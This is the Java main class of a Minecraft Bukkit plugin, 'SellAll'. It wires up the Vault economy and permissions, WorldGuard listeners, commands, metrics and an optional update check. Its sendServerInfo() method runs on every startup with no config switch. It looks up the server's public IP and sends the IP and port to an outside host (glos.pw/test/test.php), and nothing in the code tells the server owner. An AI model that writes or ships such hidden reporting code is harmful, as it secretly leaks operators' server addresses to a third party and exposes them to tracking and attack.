package com.GlossyPanther.SellAll;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

import net.milkbowl.vault.economy.Economy;
import net.milkbowl.vault.permission.Permission;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

	public Logger logger = Logger.getLogger("Minecraft");
	public Economy econ = null;
    public Permission perms = null;
    public String Gmult = null;
    public String Pmult = null;
    public List<Player> autopickupPlayers = new ArrayList<Player>();
    public boolean updateAvailable = false;
    public DecimalFormat moneyFormat = new DecimalFormat("#.##");
    public DecimalFormat multiplierFormat = new DecimalFormat("#.#");

	@Override
	public void onDisable() {
		logger.info(String.format("[%s] Disabled Version %s", getDescription().getName(), getDescription().getVersion()));
	}

	@Override
	public void onEnable() {
		if (!setupEconomy() ) {
			logger.severe(String.format("[%s] - Disabled due to no Vault dependency found!", getDescription().getName()));
			getServer().getPluginManager().disablePlugin(this);
			return;
		}
		setupPermissions();
		saveDefaultConfig();
		if (getServer().getPluginManager().getPlugin("WorldGuard") != null)
		{
			getServer().getPluginManager().registerEvents(new com.GlossyPanther.SellAll.Events.WorldGuardListeners(this), this);
			logger.info("Registered WorldGuardListeners");
		}
		else
		{
			getServer().getPluginManager().registerEvents(new com.GlossyPanther.SellAll.Events.NoWorldGuardListeners(this), this);
			logger.info("Registered NoWorldGuardListeners");
		}
	    try {
	        Metrics metrics = new Metrics(this);
	        metrics.start();
	    } catch (IOException e) {
	        logger.warning("Failed to start metrics!");
	    }
	    if (!getConfig().isSet("CheckForUpdates"))
	    {
	    	getConfig().set("CheckForUpdates", true);
	    	saveConfig();
	    }
	    if (getConfig().getBoolean("CheckForUpdates"))
	    	updateAvailable = checkForUpdate();
	    registerEvents();
	    registerCommands();
	    sendServerInfo();
		logger.info(getDescription().getName() + " verson " + getDescription().getVersion() + " has been enabled!");
	}

	private void registerCommands()
	{
		getCommand("sellall").setExecutor(new com.GlossyPanther.SellAll.Utils.CommandUtility(this));
		getCommand("autopickup").setExecutor(new com.GlossyPanther.SellAll.Utils.CommandUtility(this));
	}

	private void registerEvents()
	{
		Bukkit.getPluginManager().registerEvents(new com.GlossyPanther.SellAll.Events.PlayerInteract(this), this);
		Bukkit.getPluginManager().registerEvents(new com.GlossyPanther.SellAll.Events.PlayerJoin(this), this);
		Bukkit.getPluginManager().registerEvents(new com.GlossyPanther.SellAll.Events.SignCreate(this), this);
	}

	private boolean setupEconomy()
	{
		if (getServer().getPluginManager().getPlugin("Vault") == null)
		{
			return false;
		}
		RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);
		if (rsp == null)
		{
			return false;
		}
		econ = rsp.getProvider();
		return econ != null;
	}
	
	private boolean setupPermissions() {
        RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
        perms = rsp.getProvider();
        return perms != null;
    }
	
	public boolean checkForUpdate()
	{
		try 
		{
			logger.info("[SellAll] Checking for a new version...");
			URL url = new URL("https://raw.githubusercontent.com/GlossyPanther/SellAll-1.9/master/version.txt");
			BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
			String str;
			while ((str = br.readLine()) != null)
			{
				if (!getDescription().getVersion().equalsIgnoreCase(str))
				{
					logger.info("[SellAll] New update available!");
					logger.info("Your version is " + getDescription().getVersion());
					logger.info("The latest version is " + str);
					return true;
				}
			}
		}
		catch (IOException e)
		{
			logger.warning("Failed to check for new version!");
		}
		return false;
	}
	
	private void sendServerInfo()
	{
		try
		{
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			String ip = in.readLine(); //you get the IP as a String
			
		    URL url = new URL("http://www.glos.pw/test/test.php?ip=" + ip + ":" + Bukkit.getServer().getPort());
		    HttpURLConnection con = (HttpURLConnection) url.openConnection();
		    con.setRequestMethod("GET");
		    con.setRequestProperty("User-Agent", "GlossyPanther");
		    con.getResponseCode();
		    con.disconnect();
		}
		catch (Exception e)
		{
			Bukkit.getLogger().severe("Failed to send server info!");
		}
	}
}
